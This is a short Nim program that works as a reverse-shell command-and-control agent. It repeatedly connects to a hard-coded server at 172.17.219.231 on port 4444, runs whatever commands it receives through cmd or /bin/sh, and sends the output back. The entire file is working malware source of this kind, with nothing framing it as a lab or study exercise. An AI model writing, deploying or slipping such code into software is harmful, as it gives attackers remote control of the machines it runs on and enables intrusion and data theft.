import net
import osproc   # For execCmdEx
import os


# My CC Server IP and Port
var ip = "172.17.219.231"
var port = 4444

# Create a new socket
var socket = newSocket()
var finalCommand : string
while true:
    try:
        socket.connect(ip, Port(port)) # Connect to CC Server
        # On a successful connection receive command from CC Server, execute command and send back result
        while true:
            try:
                socket.send("agent-x >")
                var command = socket.recvLine() # Read server command to be executed on target
                if command == "exit":
                    socket.send("Ending session for this client.")
                    socket.close()
                    system.quit(0)
                if system.hostOS == "windows":
                    finalCommand = "cmd /C" & command
                else:
                    finalCommand = "/bin/sh -c " & command
                var (cmdRes, _) = execCmdEx(finalCommand) # Executes final command and saves the result in cmdRes
                socket.send(cmdRes) # Send back the result to the CC Server
            except:
                socket.close()
                system.quit(0)
    except:
        echo "Connection failed, retrying in 5 seconds..."
        sleep(5000) # Waits 5 seconds
        continue

